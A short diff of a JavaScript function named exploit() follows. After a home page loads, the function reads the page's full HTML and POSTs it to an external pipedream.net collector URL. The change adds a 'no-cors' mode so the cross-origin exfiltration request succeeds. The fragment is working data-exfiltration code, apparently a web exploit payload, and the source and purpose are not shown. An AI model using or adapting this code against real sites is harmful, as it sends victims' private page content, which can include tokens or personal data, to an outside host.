@@ -9,6 +9,7 @@ function exploit() {
   load_home(function () {
     var body = document.body.innerHTML;
     fetch('https://eny56ahhsgh5.x.pipedream.net', {
+      mode: 'no-cors',
       method: 'POST',
       body: body
     })
